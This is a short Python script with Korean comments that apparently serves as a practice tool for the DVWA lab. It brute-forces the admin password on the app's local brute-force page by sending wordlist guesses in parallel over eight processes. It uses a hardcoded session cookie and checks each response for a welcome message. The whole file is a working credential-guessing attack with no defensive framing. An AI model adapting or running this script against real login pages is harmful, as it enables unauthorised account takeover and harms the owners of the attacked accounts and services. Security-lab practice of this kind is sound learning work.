from multiprocessing import Pool
import requests
import time

url = "http://localhost/vulnerabilities/brute/"
cookie = "sqv78s0cmf06s3da5nqu4du4t"
level = "medium"
head = {"PHPSESSID":f"{cookie}", "security":f"{level}"}


def read_file(filename):
    tasks = []
    with open(filename, 'r') as file:
        for line in file:
            tasks.append([line.strip()])  # 각 문자열을 리스트로 감싸서 추가
    return tasks


def brut_force(passwordList):
    global url
    global head
    for password in passwordList:
        param = f"?username=admin&password={password}&Login=Login"
        payload = url+param
        response = requests.get(payload, cookies=head)
        if "login_logo.png" in response.text:
            print("Connection failed..")
            break
        else:
            print("input password:", password)

        if (response.status_code == 200 and 'Welcome to the password protected area' in response.text):
            return password
    return None



# # TEST 병렬처리O
if __name__ == '__main__':
    start = int(time.time())
    num_cores = 8
    pool = Pool(num_cores)
    filename = 'tools/passwordlist.txt'
    tasks = read_file(filename)
    results = pool.map(brut_force, tasks)
    end = int(time.time())

    for result in results:
        if result:
            print("password is:",result)
    print(f"걸린시간: {end-start}sec.")


# TEST 병렬처리X
# start = int(time.time())
# filename = 'tools/passwordlist.txt'
# tasks = read_file(filename)
# print(brut_force(tasks))
# end = int(time.time())
# print(f"걸린시간: {end-start}sec.")


# 코어 수 확인
# import multiprocessing

# num_cores = multiprocessing.cpu_count()
# print(f"시스템의 CPU 코어 수: {num_cores}")